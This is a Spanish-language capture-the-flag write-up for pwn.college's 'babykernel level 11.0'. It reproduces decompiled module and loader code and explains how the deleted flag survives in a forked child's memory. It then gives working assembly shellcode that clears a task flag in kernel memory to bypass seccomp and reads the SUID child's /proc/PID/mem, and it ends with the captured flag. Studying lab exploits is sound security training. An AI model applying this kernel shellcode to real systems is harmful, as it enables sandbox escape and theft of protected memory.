# level 11.0

El módulo del kernel es idéntico al del nivel 7:
```C
ssize_t device_write(file *file,char *buffer,size_t lengt h,loff_t *offset)

{
  long lVar1;
  size_t sVar2;
  
  printk(&DAT_00101118,file,buffer,length,offset);
  sVar2 = 0x1000;
  if (length < 0x1001) {
    sVar2 = length;
  }
  lVar1 = _copy_from_user(shellcode,buffer,sVar2);
  (*(code *)shellcode)();
  return length - lVar1;
}
```

Nuevamente interactuamos con este por medio de un programa en espacio de usuario:
```C

undefined8 main(undefined8 param_1,undefined8 *p aram_2)

{
  uint uVar1;
  int iVar2;
  void *pvVar3;
  ssize_t sVar4;
  undefined8 uVar5;
  int local_24;
  
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  puts("###");
  printf("### Welcome to %s!\n",*param_2);
  puts("###");
  putchar(10);
  puts("You may upload custom shellcode to do whate ver you want.\n");
  puts("For extra security, this challenge will only allow  certain system calls!\n");
  load_flag();
  unlink("/flag");
  puts("The flag has been deleted!\n");
  uVar1 = open("/proc/pwncollege",2);
  printf("Opened `/proc/pwncollege` on fd %d.\n",(ulon g)uVar1);
  puts("");
  pvVar3 = mmap((void *)0x31337000,0x1000,7,0x22, 0,0);
  if (pvVar3 != (void *)0x31337000) {
                    /* WARNING: Subroutine does not return * /
    __assert_fail("shellcode == (void *)0x31337000","<s tdin>",0x88,"main");
  }
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", 0x31337000);
  puts("Reading 0x1000 bytes of shellcode from stdin.\ n");
  sVar4 = read(0,(void *)0x31337000,0x1000);
  puts("This challenge is about to execute the followin g shellcode:\n");
  print_disassembly(0x31337000,(long)(int)sVar4);
  puts("");
  puts("Restricting system calls (default: allow).\n");
  uVar5 = seccomp_init(0x7fff0000);
  for (local_24 = 0; local_24 < 0x200; local_24 = local_2 4 + 1) {
    if (local_24 == 1) {
      printf("Allowing syscall: %s (number %i).\n","write", 1);
    }
    else {
      iVar2 = seccomp_rule_add(uVar5,0,local_24,0);
      if (iVar2 != 0) {
                    /* WARNING: Subroutine does not return * /
        __assert_fail("seccomp_rule_add(ctx, SCMP_ACT_ KILL, i, 0) == 0","<stdin>",0x9e,"main");
      }
    }
  }
  puts("Executing shellcode!\n");
  iVar2 = seccomp_load(uVar5);
  if (iVar2 != 0) {
                    /* WARNING: Subroutine does not return * /
    __assert_fail("seccomp_load(ctx) == 0","<stdin>",0xa 3,"main");
  }
  (*(code *)0x31337000)();
  puts("### Goodbye!");
  return 0;
}
```

Tiene la particularidad de que borró la flag pero mantiene su contenido en una región en memoria.
```C

void load_flag(void)

{
  __pid_t _Var1;
  int __fd;
  sem_t *__sem;
  
  puts("Attempting to load the flag into memory.\n");
  __sem = (sem_t *)mmap((void *)0x0,0x1000,3,0x21,0 ,0);
  sem_init(__sem,1,0);
  _Var1 = fork();
  if (_Var1 != 0) {
    sem_wait(__sem);
    return;
  }
  __fd = open("/flag",0);
  if (__fd < 0) {
                    /* WARNING: Subroutine does not return * /
    exit(1);
  }
  read(__fd,flag.23583,0x100);
  close(__fd);
  sem_post(__sem);
  do {
    sleep(1);
  } while( true );
}
```

```
$ checksec babykernel_level11.0
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
$ nm babykernel_level11.0 | grep flag
0000000000404040 b flag.23583
0000000000401697 T load_flag
```

Este programa no tiene PIE por lo que la dirección de flag.23583 es constante. Sin embargo, la flag se copia en la memoria del hijo, debido a COW, en ese momento ya la memoria en .bss en el hijo es independiente de la del padre por lo que este no almacenará el contenido de la flag.

Bueno, el kernel mapea toda la memoria física en cierto rango de direcciones, conocido como mapeo directo. Mi primer intento fue simplemente intentar leer esa memoria en base al patrón de la flag pero no funcionó bien:

Bueno, la otra idea fue crear un programa para mantener a *babykernel_level11.0* bloqueado para lectura, hallar el PID de su hijo y luego inyectar shellcode para que el mismo programa con el bit SUID lea */proc/{PID}/mem*:
```C
__attribute__((naked)) void shellcode() {
   __asm__(
       ".intel_syntax noprefix;"
       "sc_start:;"
       ".global _kernel_sc;"
       ".global _userland_sc;"
       "call _userland_sc;"

       "_kernel_sc:;"
       "mov rax, [gs:0x15d00];"
       "and qword ptr [rax], 0xfffffffffffffeff;"
       "xor rax, rax;"
       "ret;"

       "_userland_sc:;"
       "xor rax, rax;"
       "xor rdi, rdi;"
       "xor rsi, rsi;"
       "xor rdx, rdx;"

       // write(module_fd, kernel_sc, kernel_sc_size)
       "mov rdi, 3;"
       "pop rsi;"
       "mov rdx, _userland_sc - _kernel_sc;"
       "mov al, 1;"
       "syscall;"

       // open("/proc/{PID}/mem", O_RDONLY, 0)
       "mov rbx, 0x6d656d2f414141;"
       "push rbx;"
       "mov rbx, 0x2f636f72702f2f2f;"
       "push rbx;"
       "push rsp;"
       "pop rdi;"
       "xor rsi, rsi;"
       "xor rdx, rdx;"
       "mov rax, 2;"
       "syscall;"

       // lseek(fd, 0x404040, SEEK_SET)
       "mov rdi, rax;"
       "mov rsi, 0x404040;"
       "mov rdx, 0;"
       "mov rax, 8;"
       "syscall;"

       // read(fd, buffer, 0x100)
       "lea rsi, [rsp+0x200];"
       "mov rdx, 0x100;"
       "xor rax, rax;"
       "syscall;"

       // write(stdout, buffer, 0x100)
       "mov rdi, 1;"
       "lea rsi, [rsp+0x200];"
       "mov rdx, 0x100;"
       "mov rax, 1;"
       "syscall;"

       // exit(0)
       "mov rax, 60;"
       "xor rdi, rdi;"
       "syscall;"

       "sc_end:;"
       ".att_syntax;"
       );
}
```

Este método si funcionó. Decir quiero que estuve un rato probando a usar `sendfile` en lugar de `read` y `write` pero debido a que este es una interfaz clásica de zero-copy y los descriptores de archivos bajo */proc* no implementan ciertas funcionalidades al muchas ser entradas virtuales. Según Copilot:
```
Ese tipo de fd normalmente no implementa las rutas que sendfile() necesita para transferir páginas directamente al socket. sendfile() funciona bien cuando el in_fd soporta operaciones tipo mmap/splice/read_iter compatibles con el pipeline interno de cero-copia del kernel (p. ej. archivos regulares en FS “normal”).
```

`pwn.college{w2mPUUMZ56Gn-hwbZLOIx1c0u9T.dNDN0wCNwYzM5EzW}`

